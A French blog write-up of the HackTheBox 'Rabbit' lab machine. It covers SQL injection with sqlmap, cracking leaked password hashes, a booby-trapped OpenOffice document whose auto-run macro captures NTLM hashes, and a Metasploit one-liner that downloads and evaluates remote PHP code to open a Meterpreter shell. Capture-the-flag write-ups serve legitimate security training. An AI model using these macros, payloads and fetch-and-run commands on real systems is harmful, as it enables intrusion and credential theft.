# Solution du CTF Rabbit de HackTheBox

Soyons franc, quand je me suis penché sur le CTF Rabbit de [Hack The Box](https://www.hackthebox.eu/) je m'attendais à croiser du [RabbitMQ](https://www.rabbitmq.com/) :p   

Evidemment il n'en est rien, même si j'ai croisé un lapin durant ce challenge... Il aura eu le bénéfice de me faire jouer avec les macros VBA d'OpenOffice / LibreOffice. Et même si le comportement de ces macros s'est avéré un peu WTF c'était tout de même intéressant.  

Follow the white Rabbit
-----------------------

On commence par l'éternel scan Nmap qui décrit une machine Windows assez classique... mais aussi avec LDAP et MySQL. On note la présence d'un serveur IIS ainsi qu'un Apache avec PHP.  

```plain
Nmap scan report for 10.10.10.71
Host is up (0.051s latency).
Not shown: 917 closed ports, 59 filtered ports
PORT     STATE SERVICE           VERSION
25/tcp   open  smtp              Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.15.114], SIZE, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, X-ANONYMOUSTLS, AUTH NTLM, X-EXPS GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, XEXCH50, XRDST, XSHADOW, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Not valid before: 2017-10-24T17:56:42
|_Not valid after:  2022-10-24T17:56:42
|_ssl-date: 2018-05-14T20:16:36+00:00; +5h00m00s from scanner time.
53/tcp   open  domain            Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
80/tcp   open  http              Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 403 - Forbidden: Access is denied.
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2018-05-14 20:15:14Z)
135/tcp  open  msrpc             Microsoft Windows RPC
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
443/tcp  open  ssl/http          Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Not valid before: 2017-10-24T17:56:42
|_Not valid after:  2022-10-24T17:56:42
|_ssl-date: 2018-05-14T20:16:25+00:00; +5h00m00s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp  open  microsoft-ds?
464/tcp  open  tcpwrapped
587/tcp  open  smtp              Microsoft Exchange smtpd
| smtp-commands: Rabbit.htb.local Hello [10.10.15.114], SIZE 10485760, PIPELINING, DSN, ENHANCEDSTATUSCODES, STARTTLS, AUTH GSSAPI NTLM, 8BITMIME, BINARYMIME, CHUNKING, 
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT 
| smtp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: RABBIT
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: Rabbit.htb.local
|   DNS_Tree_Name: htb.local
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=Rabbit
| Subject Alternative Name: DNS:Rabbit, DNS:Rabbit.htb.local
| Not valid before: 2017-10-24T17:56:42
|_Not valid after:  2022-10-24T17:56:42
|_ssl-date: 2018-05-14T20:16:37+00:00; +5h00m00s from scanner time.
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
808/tcp  open  ccproxy-http?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3306/tcp open  mysql             MySQL 5.7.19
|_mysql-info: ERROR: Script execution failed (use -d to debug)
6001/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6002/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6003/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6004/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6005/tcp open  msrpc             Microsoft Windows RPC
6006/tcp open  msrpc             Microsoft Windows RPC
6007/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.27 ((Win64) PHP/5.6.31)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Win64) PHP/5.6.31
|_http-title: Example
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=5/14%OT=25%CT=1%CU=38749%PV=Y%DS=2%DC=T%G=Y%TM=5AF9A8C
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TS=7)SEQ(SP=106%GCD=1%I
OS:SR=10E%CI=I%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M5
OS:4DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF
OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Hosts: Rabbit.htb.local, RABBIT; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
|_smb2-time: Protocol negotiation failed (SMB2)
```

Commençons par le serveur IIS sur le port 443. J'ai lancé mon buster perso et j'ai trouvé différentes URL qui m'ont presque toutes ramenées vers un *Outlook Web Access* :  

```plain
https://10.10.10.71/public/ - HTTP 302 (147 bytes, plain) redirects to https://10.10.10.71/owa/
https://10.10.10.71/exchange/ - HTTP 302 (147 bytes, plain) redirects to https://10.10.10.71/owa/
https://10.10.10.71/owa/ - HTTP 302 (0 bytes, plain) redirects to https://10.10.10.71/owa/auth/logon.aspx?url=https://10.10.10.71/owa/&reason=0
https://10.10.10.71/powershell/ - HTTP 401 (1293 bytes, plain)
https://10.10.10.71/ews/ - HTTP 401 (0 bytes, plain)
https://10.10.10.71/exchweb/ - HTTP 302 (147 bytes, plain) redirects to https://10.10.10.71/owa/
```

La pèche est meilleure avec le serveur Apache. La page d'index est un ascii-art avec un lapin.  

![HackTheBox Rabbit ascii-art](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_ascii_art.jpg)

```plain
http://10.10.10.71:8080/phpmyadmin/
http://10.10.10.71:8080/phpsysinfo/
http://10.10.10.71:8080/complain/
http://10.10.10.71:8080/joomla/
```

Les deux premières URL retournent une erreur 403. L'investigation sur le Joomla (à l'aide de [CMSmap](https://github.com/Dionach/CMSmap)) n'a mené nul part.  

A l'URL */complain/* on trouve une appli de relation client qui s'appelle *Complain Management System*.  

Il existe [deux vulnérabilités](https://www.exploit-db.com/exploits/42968/) pour ce logiciel. On pourrait qualifier la première de backdoor vu qu'il s'agit d'un compte hardcodé. Malheureusement le mot de passe a visiblement été édité pour le challenge.  

La seconde est une faille d'injection SQL pour laquelle il faut être authentifié.  

Avec un buster on trouve différents dossiers, en particulier le dossier *database* dispose d'un listing avec un fichier *complain\_db.sql* qui s'en trop de surprises est un dump MySQL de la base de données.  

On y trouve plusieurs tables avec des utilisateurs : *tbl\_customer*, *tbl\_supplier* et *tbl\_engineer*. Cette dernière semble plus intéressante car les utilisateurs semblent avoir plus de privilèges.  

Les mots de passe sont stockés en clair dans la base :  

```plain
INSERT INTO `tbl_engineer` (`eid`, `ename`, `epass`, `address`, `email`, `e_mobile`, `date_time`) VALUES
(6, 'Amol sarode', 'amol', '12/c, camp, pune', 'amol.sarode@gmail.co', '2541258452', '2011-02-02 23:36:51'),
(5, 'Ramiz Khan', 'ramiz', '10, merta tower', 'ramiz@gmail.com', '9854251425', '2011-02-02 23:36:09'),
(4, 'Mubarak Bahesti', 'mubarak', '290, asif nagar, pune', 'mubarak@gmail.com', '9856323568', '2011-02-02 23:15:20');
```

Civet de lapin
--------------

On peut dès lors se connecter avec l'un des comptes, récupérer le cookie (via extension dédiée ou via les outils de développement du navigateur) puis utiliser ce cookie dans sqlmap pour exploiter la vulnérabilité mentionnée plus tôt :  

```plain
devloop@kali:~$ sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans' -p id --cookie "PHPSESSID=nj9rojjcqt74jeidet86csire6" --dbms mysql
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 1363 HTTP(s) requests:
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: mod=admin&view=repod&id=plans WHERE 8103=8103 AND (SELECT 9626 FROM(SELECT COUNT(*),CONCAT(0x716a627071,(SELECT (ELT(9626=9626,1))),0x71766a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qhHP

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: mod=admin&view=repod&id=plans WHERE 7037=7037 AND SLEEP(5)-- JjKS
---
```

Il apparaît assez vite que les requêtes sont exécutées avec l'utilisateur root de MySQL. On ne peut malheureusement pas dumper directement la base (via connexion au port 3306) car l'utilisateur est seulement autorisé à se connecter en local. Pas trop grave quand on a sqlmap sous la main.  

```plain
available databases [7]:
[*] complain
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] secret
[*] sys
```

On ne trouve rien d'intéressant dans *complain* mais la base *secret* nous apporte des hashs supplémentaires (sqlmap a cassé certains des hashs, j'ai édité les autres trouvés via [CrackStation](https://crackstation.net/)) :  

```plain
Database: secret                                                                                                                                                                                                  
Table: users
[10 entries]
+----------+-----------------------------------------------------+
| Username | Password                                            |
+----------+-----------------------------------------------------+
| Zephon   | 13fa8abd10eed98d89fd6fc678afaf94                    |
| Kain     | 33903fbcc0b1046a09edfaa0a65e8f8c (doradaybendita)   |
| Dumah    | 33da7a40473c1637f1a2e142f4925194 (popcorn)          |
| Magnus   | 370fc3559c9f0bff80543f2e1151c537 (xNnWo6272k7x)     |
| Raziel   | 719da165a626b4cf23b626896c213b84 (kelseylovesbarry) |
| Moebius  | a6f30815a43f38ec6de95b9a9d74da37 (santiago)         |
| Ariel    | b9c2538d92362e0e18e52d0ee9ca0c6f (pussycatdolls)    |
| Turel    | d322dc36451587ea2994c84c9d9717a1                    |
| Dimitri  | d459f76a5eeeed0eca8ab4476c144ac4 (shaunamaloney)    |
| Malek    | dea56e47f1c62c30b83b70eb281a6c39 (barcelona)        |
+----------+-----------------------------------------------------+
```

A ce stade, vu qu'on dispose des droits les plus importants de MySQL et qu'en plus j'ai aussi trouvé le DocumentRoot via un message d'erreur, on serait tenter de poser une backdoor PHP sur le système avec INTO OUTFILE ([voir Tales of pentest #1](http://devloop.users.sourceforge.net/index.php?article128/tales-of-pentest-1-celui-qui-donnait-la-permission-file)).  

![HackTheBox Rabbit CTF php file disclosing path](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_repo_error_path.jpg)

Seulement on ne peut pas le faire en raison d'un MySQL 5.7.19 avec l'option *secure\_file\_priv* lisible via *--sql-shell* de sqlmap :  

```plain
sql-shell> select @@global.secure_file_priv;
[16:46:22] [INFO] fetching SQL SELECT statement query output: 'select @@global.secure_file_priv'
[16:46:29] [INFO] retrieved: c:\\wamp64\\tmp\\
select @@global.secure_file_priv;:    'c:\\wamp64\\tmp\\'
```

Du coup j'ai choisi de placer les noms d'utilisateurs dans un fichier, les passwords dans un autre et de tester tout ça sur différents services.  

On peut par exemple utiliser le module *gather/kerberos\_enumusers* de *Metasploit* qui nous indique que tous les utilisateurs ne sont pas présents sur le système :  

```plain
[+] 10.10.10.71:88 - User: "administrator" is present
[*] 10.10.10.71:88 - Testing User: "kain"...
[*] 10.10.10.71:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.71:88 - User: "kain" is present
[*] 10.10.10.71:88 - Testing User: "zephon"...
[*] 10.10.10.71:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database
[*] 10.10.10.71:88 - User: "zephon" does not exist
[*] 10.10.10.71:88 - Testing User: "dumah"...
[*] 10.10.10.71:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database
[*] 10.10.10.71:88 - User: "dumah" does not exist
[*] 10.10.10.71:88 - Testing User: "magnus"...
[*] 10.10.10.71:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.71:88 - User: "magnus" is present
[*] 10.10.10.71:88 - Testing User: "raziel"...
[*] 10.10.10.71:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.71:88 - User: "raziel" is present
[*] 10.10.10.71:88 - Testing User: "moebius"...
[*] 10.10.10.71:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database
[*] 10.10.10.71:88 - User: "moebius" does not exist
[*] 10.10.10.71:88 - Testing User: "ariel"...
[*] 10.10.10.71:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
[+] 10.10.10.71:88 - User: "ariel" is present
```

de quoi réduire notre liste à ces credentials :  

```plain
kain doradaybendita
magnus xNnWo6272k7x
raziel kelseylovesbarry
ariel pussycatdolls
```

On peut les utiliser pour fouiller dans l'annuaire LDAP (*ldapsearch -x -H ldap://10.10.10.71:3268/ -D kain -w doradaybendita*) mais ça m'a fait une belle jambe.  

Ça devient plus intéressant quand on les essaye sur le OWA (EWS est en quelque sorte l'API):  

```plain
msf auxiliary(scanner/http/owa_ews_login) > exploit

[+] Found NTLM service at /ews/ for domain HTB.
[+] 10.10.10.71:443 - Successful login: kain:doradaybendita
[+] 10.10.10.71:443 - Successful login: magnus:xNnWo6272k7x
[+] 10.10.10.71:443 - Successful login: ariel:pussycatdolls
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

APT 101
-------

Une fois connecté sur le webmail (par exemple avec *Ariel*) on voit que quelqu'un attend de recevoir son rapport *TPS* (kezako ? aucune importance).  

![HackTheBox Rabbit TPS report email](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_tps_reports_mail.jpg)

Il y a aussi deux emails, l'un pour indiquer que l'entreprise est passée à *Open Office*, l'autre pour indiquer la sécurisation des systèmes avec Windows Defender et le passage de Powershell en mode *Constrained Language* (voir [ici](https://blogs.msdn.microsoft.com/powershell/2017/11/02/powershell-constrained-language-mode/)).  

Les indices sont donc assez explicites et on va devoir envoyer un document ODT piégé à l'un des utilisateurs afin d'obtenir un shell.  

La première chose que j'ai essayé c'est l'inclusion de référence à des documents distants dans le document. C'est la même technique qui peut servir [à désanonymiser des utilisateurs de Tor](http://devloop.users.sourceforge.net/index.php?article131/les-questions-cons-du-hacking-comment-desanonymiser-un-utilisateur-de-tor).  

Pour cela on crée d'abord un fichier HTML :  

```plain
<html>
<body>
<img src="file://///10.10.15.90/share/img.png" />
<img src="http://10.10.15.90/nawak/img.png" />
</body>
</html>
```

que l'on intègre ensuite dans un document ODT (LibreOffice/OpenOffice Writer) via *Insert > Text from file* (visiblement ça a changé et oui c'est pas parlant du tout...)  

On aura préalablement lancé deux modules *Metasploit* à savoir *auxiliary/server/capture/smb* et *auxiliary/server/capture/http\_ntlm*.  

On attend un peu... et force est de constater que rien ne s'est passé :p   

On passe alors à l'option Macros : on crée un nouveau document ODT puis on va sur *Tools > Macros > Edit Macros* :  

Il faut ensuite :  

1. Aller sur l'icône Modules
2. Aller sur l'entrée *Standard* sous le nom de notre document
3. Créer un nouveau module

![HackTheBox Rabbit ODT Macro creation](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_new_macro.jpg)

On place alors une macro avec un nom quelconque, par exemple :  

```plain
Sub RogerRabbit
    Shell("net use x: \\10.10.15.90")
End Sub
```

Il faut ensuite ferme la fenêtre d'édition des Macros et aller dans *Tools > Customize* puis :  

1. Sélectionner l’événement *Open Document*
2. Cliquer sur Macro
3. Choisir notre module
4. Et la macro
5. S'assurer que c'est enregistré dans le fichier

![Rabbit HackTheBox assign macro to open document event](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_assign_load_macro.png)

On envoi le document à tous les destinataires du carnet d'adresse et on attend. Au bout d'un moment il y a de l'activité dans le *tshark* :  

```plain
 1 0.000000000  10.10.10.71 → 10.10.15.90  TCP 52 54540 → 445 [SYN] Seq=0 Win=8192 Len=0 MSS=1357 WS=256 SACK_PERM=1
 2 0.000049420  10.10.15.90 → 10.10.10.71  TCP 52 445 → 54540 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0 MSS=1460 SACK_PERM=1 WS=128
 3 0.027699057  10.10.10.71 → 10.10.15.90  TCP 40 54540 → 445 [ACK] Seq=1 Ack=1 Win=66304 Len=0
 4 0.027824577  10.10.10.71 → 10.10.15.90  SMB 199 Negotiate Protocol Request
 5 0.027853649  10.10.15.90 → 10.10.10.71  TCP 40 445 → 54540 [ACK] Seq=1 Ack=160 Win=30336 Len=0
 6 0.046989753  10.10.15.90 → 10.10.10.71  SMB 125 Negotiate Protocol Response
 7 0.080186409  10.10.10.71 → 10.10.15.90  SMB 268 Session Setup AndX Request, User: HTB\Raziel; Tree Connect AndX, Path: \\10.10.15.90\IPC$
 8 0.131207779  10.10.15.90 → 10.10.10.71  TCP 40 445 → 54540 [ACK] Seq=86 Ack=388 Win=31360 Len=0
 9 0.645411556  10.10.15.90 → 10.10.10.71  SMB 79 Session Setup AndX Response, Error: STATUS_LOGON_FAILURE
10 0.870946871  10.10.10.71 → 10.10.15.90  TCP 40 54540 → 445 [ACK] Seq=388 Ack=125 Win=66304 Len=0
```

et aussi sur le module auxiliaire de capture SMB :  

```plain
[*] SMB Captured - 2018-05-31 20:15:14 +0200
NTLMv2 Response Captured from 10.10.10.71:54540 - 10.10.10.71
USER:Raziel DOMAIN:HTB OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:3d87ccd87f54c4a87f114e8f911d8573 
NT_CLIENT_CHALLENGE:0101000000000000c4bd83f002f9d3016e947c7a98c1fec900000000020000000000000000000000
```

C'est très important d'avoir défini l'option *JOHNPWFILE* sur ce module car il permet d'obtenir le hash sous un format adapté à JTR et hashcat... Je ne sais pas comment l'obtenir depuis juste l'output :p   

La bonne nouvelle c'est que l'on a une bonne réponse et que l'on sait qui ouvre les documents. La mauvaise c'est que le hash s'est avéré trop fort pour être cassable...  

J'ai essayé à peut près toutes les méthodes pour obtenir un shell sur la machine depuis la macro : téléchargement via bitsadmin, certutil, regsvr32, tftp et j'en passe...  

Bref j'ai essayé beaucoup de choses qui ont toutes fonctionnés parfaitement en local sur un Windows 10 avec *Windows Defender* qui tournait et avec *LibreOffice*.  

Peut-être que OpenOffice est légèrement différent en terme de Macros, ce qui serait cependant étonnant...  

Au vu de tout ça j'ai demandé à [@h4d3sw0rm](https://twitter.com/h4d3sw0rm) la technique qu'il avait employé et il suffisait d'utiliser *certutil* pour télécharger sans encodage préalable un netcat dans *c:\temp* (ça il fallait le deviner) et l'exécuter.  

D'autant plus énervant qu'en local *Defender* bloquait toute utilisation de *certutil* pour le téléchargement... Il y a quelques ratés sur ce CTF qui ont agacé beaucoup de monde.  

Une fois le shell netcat obtenu on peut l'upgrader vers un Meterpreter mais avec Defender la plupart des techniques sont bloquées. J'ai profité de la présence de PHP sur le système avec le module web\_delivery :  

```plain
msf exploit(multi/script/web_delivery) > exploit -j
[*] Exploit running as background job 4.

[*] Started reverse TCP handler on 10.10.14.20:1478 
[*] Using URL: http://10.10.14.20:8080/s4380f
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.10.14.20:8080/s4380f'));"
msf exploit(multi/script/web_delivery) > [*] 10.10.10.71      web_delivery - Delivering Payload
[*] Sending stage (37775 bytes) to 10.10.10.71
[*] Meterpreter session 1 opened (10.10.14.20:1478 -> 10.10.10.71:37732) at 2018-05-22 20:23:19 +0200
```

Final pwnage
------------

La dernière étape aura été la plus simple. Pour avoir déjà croisé WAMP dans un pentest je sais que [ce dernier fait tourner les scripts avec les droits SYSTEM](http://devloop.users.sourceforge.net/index.php?article128/tales-of-pentest-1-celui-qui-donnait-la-permission-file).  

![HackTheBox Rabbit php code running as SYSTEM](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_whoami_upload_joomla.png)

Dès lors il suffisait de placer une backdoor PHP sous la racine du Apache et on pouvait accéder au flag de l'administrateur.  

![HackTheBox Rabbit root flag](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/rabbit_root_flag.png)

Autant vous dire que j'étais content que ce CTF soit enfin terminé :D Ça a été très fun de jouer avec les macros mais ça aurait été encore plus fun si l'expérience n'avait pas été aussi irritante (on se demande pourquoi autant de tentatives ont échouées alors qu'elles fonctionnait parfaitement en ayant recréé l’environnement en local).  

En jouant une nouvelle fois avec la machine plus tard j'ai vu que l'on pouvait tout simplement faire exécuter une backdoor générée via *Shellter* en appelant un chemin UNC dans la macro. Bien sûr le comportement du *Meterpreter* pouvait être détecté en fonction de l'action utilisée.

*Published August 18 2018 at 21:47*